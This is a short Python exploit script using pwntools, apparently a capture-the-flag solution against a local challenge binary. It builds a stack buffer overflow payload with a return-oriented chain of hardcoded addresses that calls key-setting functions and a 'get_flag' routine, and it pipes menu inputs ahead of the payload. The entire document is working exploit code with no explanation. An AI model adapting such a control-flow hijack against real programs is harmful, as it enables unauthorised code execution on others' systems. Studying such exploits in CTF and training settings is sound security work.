from pwn import *

import struct

import sys

padding = b"a" * 0x18
padding += b"bbbb"

padding += struct.pack("I", 0x565567cd) # AAsDrwEk (get_key3)
padding += struct.pack("I", 0x5655676e) # get_key2
padding += struct.pack("I", 0x565566de) # get_key1
padding += struct.pack("I", 0x565567e7) # pop ebx; ret
padding += struct.pack("I", 0xFEEDC0DE) # get_key1 arg
padding += struct.pack("I", 0x565567e9) # set_key4
padding += struct.pack("I", 0x5655686b) # get_flag

sys.stdout.buffer.write(b"2")
sys.stdout.buffer.write(b"4")
sys.stdout.buffer.write(b"3")
sys.stdout.buffer.write(b"Stephen\n")

sys.stdout.buffer.write(padding)


# io = connect("127.0.0.1", "30012")
# print(io.recvregex("Quit\n"))

# io.sendline('2')
